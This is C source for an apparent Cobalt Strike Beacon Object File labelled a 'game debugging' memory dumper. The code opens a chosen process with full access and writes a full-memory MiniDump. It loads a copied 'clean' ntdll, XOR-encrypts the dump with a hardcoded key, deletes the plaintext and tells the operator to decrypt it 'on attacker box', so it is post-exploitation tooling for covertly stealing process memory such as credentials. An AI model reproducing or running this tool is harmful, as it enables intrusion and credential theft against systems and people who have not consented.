/*
 * memdumper - Memory Dumper BOF for game debugging
 *
 * Usage: memdumper /process:PROCESSNAME [/output:OUTPUTFOLDER]
 *
 * Example:
 *   inline-execute C:\path\to\memdumper.x64.o /process:readyone
 *   inline-execute C:\path\to\memdumper.x64.o /process:notepad /output:C:\Dumps
 *
 * Description:
 *   Creates a MiniDump of the target process for analysis in tools like
 *   Cheat Engine, x64dbg, or WinDbg.
 *
 * Requirements:
 *   - Requires administrator privileges
 *   - Target process must be running
 */

#include <windows.h>
#include <tlhelp32.h>
#include "../beacon.h"

/* ============================================================================
 * Dynamic Function Resolution (DFR) Declarations
 * ============================================================================ */

/* KERNEL32 */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE, PLARGE_INTEGER);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetSystemDirectoryA(LPSTR, UINT);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTempPathA(DWORD, LPSTR);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CopyFileA(LPCSTR, LPCSTR, BOOL);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR, HANDLE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);

/* MSVCRT */
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strstr(const char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char*, int);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strncpy(char*, const char*, size_t);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcat(char*, const char*);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT char* __cdecl MSVCRT$_strdup(const char*);

/* SHELL32 */
DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND, int, HANDLE, DWORD, LPSTR);

/* Macros for cleaner code */
#define malloc      MSVCRT$malloc
#define free        MSVCRT$free
#define memset      MSVCRT$memset
#define stricmp     MSVCRT$_stricmp
#define strstr      MSVCRT$strstr
#define strchr      MSVCRT$strchr
#define strlen      MSVCRT$strlen
#define strcpy      MSVCRT$strcpy
#define strncpy     MSVCRT$strncpy
#define strcat      MSVCRT$strcat
#define sprintf     MSVCRT$sprintf
#define strdup      MSVCRT$_strdup

/* CSIDL for desktop path */
#ifndef CSIDL_DESKTOP
#define CSIDL_DESKTOP 0x0000
#endif

/* MiniDump types (from dbghelp.h) */
typedef enum _MINIDUMP_TYPE {
    MiniDumpNormal                          = 0x00000000,
    MiniDumpWithDataSegs                    = 0x00000001,
    MiniDumpWithFullMemory                  = 0x00000002,
    MiniDumpWithHandleData                  = 0x00000004,
    MiniDumpFilterMemory                    = 0x00000008,
    MiniDumpScanMemory                      = 0x00000010,
    MiniDumpWithUnloadedModules             = 0x00000020,
    MiniDumpWithIndirectlyReferencedMemory  = 0x00000040,
    MiniDumpFilterModulePaths               = 0x00000080,
    MiniDumpWithProcessThreadData           = 0x00000100,
    MiniDumpWithPrivateReadWriteMemory      = 0x00000200,
    MiniDumpWithoutOptionalData             = 0x00000400,
    MiniDumpWithFullMemoryInfo              = 0x00000800,
    MiniDumpWithThreadInfo                  = 0x00001000,
    MiniDumpWithCodeSegs                    = 0x00002000,
    MiniDumpWithoutAuxiliaryState           = 0x00004000,
    MiniDumpWithFullAuxiliaryState          = 0x00008000,
    MiniDumpWithPrivateWriteCopyMemory      = 0x00010000,
    MiniDumpIgnoreInaccessibleMemory        = 0x00020000,
    MiniDumpWithTokenInformation            = 0x00040000,
    MiniDumpWithModuleHeaders               = 0x00080000,
    MiniDumpFilterTriage                    = 0x00100000,
    MiniDumpValidTypeFlags                  = 0x001fffff
} MINIDUMP_TYPE;

/* MiniDumpWriteDump function pointer type */
typedef BOOL (WINAPI *MiniDumpWriteDump_t)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PVOID ExceptionParam,
    PVOID UserStreamParam,
    PVOID CallbackParam
);

/* ============================================================================
 * Argument Parser
 * ============================================================================ */

typedef struct _ARG_PARSER {
    char* buffer;
    size_t buflen;
} ARG_PARSER;

static void arg_init(ARG_PARSER* p, char* args, int len) {
    p->buffer = args;
    p->buflen = len;
}

static char* arg_get(ARG_PARSER* p, const char* key) {
    char pattern[64];
    sprintf(pattern, "/%s:", key);
    char* found = strstr(p->buffer, pattern);
    if (!found) return NULL;

    char* value = found + strlen(pattern);
    char* end = strchr(value, ' ');
    if (!end) end = value + strlen(value);

    size_t len = end - value;
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;

    strncpy(result, value, len);
    result[len] = '\0';
    return result;
}

/* ============================================================================
 * Helper Functions
 * ============================================================================ */

/* Find process by name, return PID (0 if not found) */
static DWORD FindProcessByName(const char* processName, formatp* output) {
    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!KERNEL32$Process32First(hSnapshot, &pe32)) {
        KERNEL32$CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    char searchName[MAX_PATH];
    sprintf(searchName, "%s.exe", processName);

    do {
        if (stricmp(pe32.szExeFile, searchName) == 0 ||
            stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (KERNEL32$Process32Next(hSnapshot, &pe32));

    KERNEL32$CloseHandle(hSnapshot);
    return pid;
}

/* Get Desktop path */
static void GetDesktopPath(char* buffer, size_t bufferSize) {
    if (SUCCEEDED(SHELL32$SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buffer))) {
        return;
    }
    /* Fallback */
    strcpy(buffer, "C:\\");
}

/* ============================================================================
 * XOR Encryption - matches PowerShell Decrypt-Dump key
 * Key: "M3mDump!" = { 0x4D, 0x33, 0x6D, 0x44, 0x75, 0x6D, 0x70, 0x21 }
 * ============================================================================ */

static const BYTE XOR_KEY[] = { 0x4D, 0x33, 0x6D, 0x44, 0x75, 0x6D, 0x70, 0x21 };
#define XOR_KEY_LEN 8
#define XOR_BUFFER_SIZE (64 * 1024)  /* 64KB buffer, same as PowerShell */

/* XOR encrypt a file in-place using chunked reads/writes
 * Returns TRUE on success, FALSE on failure */
static BOOL XorEncryptFile(const char* inPath, const char* outPath, formatp* output) {
    HANDLE hIn = INVALID_HANDLE_VALUE;
    HANDLE hOut = INVALID_HANDLE_VALUE;
    BYTE* buffer = NULL;
    BOOL result = FALSE;
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    LONGLONG totalRead = 0;

    buffer = (BYTE*)malloc(XOR_BUFFER_SIZE);
    if (!buffer) {
        BeaconFormatPrintf(output, "[-] Failed to allocate XOR buffer\n");
        goto xor_cleanup;
    }

    hIn = KERNEL32$CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(output, "[-] Failed to open dump for encryption. Error: %lu\n",
                          KERNEL32$GetLastError());
        goto xor_cleanup;
    }

    hOut = KERNEL32$CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(output, "[-] Failed to create encrypted file. Error: %lu\n",
                          KERNEL32$GetLastError());
        goto xor_cleanup;
    }

    while (KERNEL32$ReadFile(hIn, buffer, XOR_BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        /* XOR each byte with the cycling key */
        for (DWORD i = 0; i < bytesRead; i++) {
            buffer[i] ^= XOR_KEY[(totalRead + i) % XOR_KEY_LEN];
        }
        totalRead += bytesRead;

        if (!KERNEL32$WriteFile(hOut, buffer, bytesRead, &bytesWritten, NULL) ||
            bytesWritten != bytesRead) {
            BeaconFormatPrintf(output, "[-] Write error during encryption. Error: %lu\n",
                              KERNEL32$GetLastError());
            goto xor_cleanup;
        }
    }

    result = TRUE;

xor_cleanup:
    if (buffer) free(buffer);
    if (hIn != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hIn);
    if (hOut != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hOut);
    return result;
}

/* ============================================================================
 * BOF Entry Point
 * ============================================================================ */

void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* processName = NULL;
    char* outputFolder = NULL;
    HMODULE hDbgHelp = NULL;
    MiniDumpWriteDump_t pMiniDumpWriteDump = NULL;
    HANDLE processHandle = NULL;
    HANDLE fileHandle = INVALID_HANDLE_VALUE;
    char tempPath[MAX_PATH] = {0};
    HMODULE cleanHandle = NULL;

    BeaconFormatAlloc(&output, 8192);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "[*] Memory Dumper BOF (MiniDump Format)\n");
    BeaconFormatPrintf(&output, "============================================================\n");

    /* Parse arguments */
    processName = arg_get(&parser, "process");
    outputFolder = arg_get(&parser, "output");

    if (!processName) {
        BeaconFormatPrintf(&output, "[-] Missing required /process: parameter\n\n");
        BeaconFormatPrintf(&output, "Usage: memdumper /process:PROCESSNAME [/output:OUTPUTFOLDER]\n");
        BeaconFormatPrintf(&output, "Example: memdumper /process:readyone /output:C:\\Dumps\n");
        goto cleanup;
    }

    /* Remove .exe if present */
    char* ext = strstr(processName, ".exe");
    if (ext) *ext = '\0';

    /* Set output folder */
    char outputPath[MAX_PATH];
    if (outputFolder) {
        strcpy(outputPath, outputFolder);
    } else {
        GetDesktopPath(outputPath, MAX_PATH);
        strcat(outputPath, "\\CleanDump");
    }

    /* Create output folder */
    KERNEL32$CreateDirectoryA(outputPath, NULL);

    /* Find process */
    DWORD pid = FindProcessByName(processName, &output);
    if (pid == 0) {
        BeaconFormatPrintf(&output, "[-] %s.exe not found!\n", processName);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Found %s.exe (PID: %lu)\n", processName, pid);

    /* Load clean ntdll from disk */
    BeaconFormatPrintf(&output, "[*] Loading clean ntdll.dll from disk...\n");

    char systemPath[MAX_PATH];
    KERNEL32$GetSystemDirectoryA(systemPath, MAX_PATH);

    char cleanPath[MAX_PATH];
    sprintf(cleanPath, "%s\\ntdll.dll", systemPath);

    char tempDir[MAX_PATH];
    KERNEL32$GetTempPathA(MAX_PATH, tempDir);
    sprintf(tempPath, "%sntdll_clean_%lu.dll", tempDir, KERNEL32$GetTickCount());

    if (!KERNEL32$CopyFileA(cleanPath, tempPath, FALSE)) {
        BeaconFormatPrintf(&output, "[-] Failed to copy clean ntdll\n");
        goto cleanup;
    }

    cleanHandle = KERNEL32$LoadLibraryExA(tempPath, NULL, 0);
    if (cleanHandle == NULL) {
        BeaconFormatPrintf(&output, "[-] Failed to load clean ntdll\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Clean ntdll loaded at: 0x%p\n", (void*)cleanHandle);

    /* Load dbghelp.dll and get MiniDumpWriteDump */
    hDbgHelp = KERNEL32$LoadLibraryExA("dbghelp.dll", NULL, 0);
    if (!hDbgHelp) {
        hDbgHelp = KERNEL32$GetModuleHandleA("dbghelp.dll");
    }

    if (!hDbgHelp) {
        BeaconFormatPrintf(&output, "[-] Failed to load dbghelp.dll\n");
        goto cleanup;
    }

    pMiniDumpWriteDump = (MiniDumpWriteDump_t)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        BeaconFormatPrintf(&output, "[-] Failed to get MiniDumpWriteDump address\n");
        goto cleanup;
    }

    /* Open process */
    BeaconFormatPrintf(&output, "[*] Opening process with full access for MiniDump...\n");

    processHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (processHandle == NULL) {
        DWORD errorCode = KERNEL32$GetLastError();
        BeaconFormatPrintf(&output, "[-] OpenProcess failed. Error: %lu\n", errorCode);
        BeaconFormatPrintf(&output, "[-] Make sure you're running with elevated privileges!\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Process opened with handle: %p\n", processHandle);

    /* Create dump file */
    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);

    char timestamp[32];
    sprintf(timestamp, "%04d%02d%02d_%02d%02d%02d",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond);

    char dumpFileName[MAX_PATH];
    sprintf(dumpFileName, "%s_%lu_%s.dmp", processName, pid, timestamp);

    char dumpFilePath[MAX_PATH];
    sprintf(dumpFilePath, "%s\\%s", outputPath, dumpFileName);

    BeaconFormatPrintf(&output, "[*] Creating MiniDump file: %s\n", dumpFileName);

    fileHandle = KERNEL32$CreateFileA(
        dumpFilePath,
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (fileHandle == INVALID_HANDLE_VALUE) {
        DWORD errorCode = KERNEL32$GetLastError();
        BeaconFormatPrintf(&output, "[-] Failed to create dump file. Error: %lu\n", errorCode);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Dump file created\n");

    BeaconFormatPrintf(&output, "[*] Writing MiniDump (this may take a moment)...\n");

    BOOL success = pMiniDumpWriteDump(
        processHandle,
        pid,
        fileHandle,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    DWORD lastError = KERNEL32$GetLastError();

    /* Close file handle before checking size */
    KERNEL32$CloseHandle(fileHandle);
    fileHandle = INVALID_HANDLE_VALUE;

    /* Check result */
    if (success) {
        HANDLE checkFile = KERNEL32$CreateFileA(dumpFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        LARGE_INTEGER fileSize;
        fileSize.QuadPart = 0;

        if (checkFile != INVALID_HANDLE_VALUE) {
            KERNEL32$GetFileSizeEx(checkFile, &fileSize);
            KERNEL32$CloseHandle(checkFile);
        }

        if (fileSize.QuadPart > 0) {
            double fileSizeMB = (double)fileSize.QuadPart / (1024.0 * 1024.0);

            BeaconFormatPrintf(&output, "[+] MiniDump created (%.2f MB), encrypting...\n", fileSizeMB);

            /* Build encrypted file path: original.dmp -> original.dmp.enc */
            char encFilePath[MAX_PATH];
            sprintf(encFilePath, "%s.enc", dumpFilePath);

            if (XorEncryptFile(dumpFilePath, encFilePath, &output)) {
                /* Delete the original unencrypted dump */
                KERNEL32$DeleteFileA(dumpFilePath);

                /* Get encrypted file size */
                HANDLE encCheck = KERNEL32$CreateFileA(encFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                LARGE_INTEGER encSize;
                encSize.QuadPart = 0;
                if (encCheck != INVALID_HANDLE_VALUE) {
                    KERNEL32$GetFileSizeEx(encCheck, &encSize);
                    KERNEL32$CloseHandle(encCheck);
                }
                double encSizeMB = (double)encSize.QuadPart / (1024.0 * 1024.0);

                BeaconFormatPrintf(&output, "============================================================\n");
                BeaconFormatPrintf(&output, "[+] SUCCESS! Encrypted MiniDump created!\n");
                BeaconFormatPrintf(&output, "[+] File: %s\n", encFilePath);
                BeaconFormatPrintf(&output, "[+] Size: %.2f MB\n", encSizeMB);
                BeaconFormatPrintf(&output, "[+] Original .dmp deleted\n");
                BeaconFormatPrintf(&output, "\n");
                BeaconFormatPrintf(&output, "Decrypt on attacker box with PowerShell:\n");
                BeaconFormatPrintf(&output, "  Decrypt-Dump -InFile dump.dmp.enc -OutFile dump.dmp\n");
                BeaconFormatPrintf(&output, "\n");
                BeaconFormatPrintf(&output, "Then open the decrypted dump with:\n");
                BeaconFormatPrintf(&output, "  - Cheat Engine (File > Open Process > Open File)\n");
                BeaconFormatPrintf(&output, "  - x64dbg (File > Open > Open Dump)\n");
                BeaconFormatPrintf(&output, "  - WinDbg (File > Open Crash Dump)\n");
            } else {
                /* Encryption failed - keep the original dump */
                BeaconFormatPrintf(&output, "[-] Encryption failed, raw dump preserved at: %s\n", dumpFilePath);
            }
        } else {
            BeaconFormatPrintf(&output, "[-] Dump file created but appears empty\n");
        }
    } else {
        BeaconFormatPrintf(&output, "[-] MiniDumpWriteDump failed. Error code: %lu\n", lastError);

        switch (lastError) {
            case 5:
                BeaconFormatPrintf(&output, "[-] Access Denied - Run with elevated privileges\n");
                break;
            case 6:
                BeaconFormatPrintf(&output, "[-] Invalid Handle - Process may have exited\n");
                break;
            case 87:
                BeaconFormatPrintf(&output, "[-] Invalid Parameter\n");
                break;
            case 299:
                BeaconFormatPrintf(&output, "[-] Partial read - Some memory couldn't be read\n");
                break;
            default:
                BeaconFormatPrintf(&output, "[-] Try running with elevated privileges\n");
                break;
        }

        KERNEL32$DeleteFileA(dumpFilePath);
    }

cleanup:
    /* Cleanup */
    if (fileHandle != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(fileHandle);
    }
    if (processHandle) {
        KERNEL32$CloseHandle(processHandle);
    }
    if (cleanHandle) {
        KERNEL32$FreeLibrary(cleanHandle);
    }
    if (tempPath[0] != '\0') {
        KERNEL32$DeleteFileA(tempPath);
    }
    if (processName) {
        free(processName);
    }
    if (outputFolder) {
        free(outputFolder);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
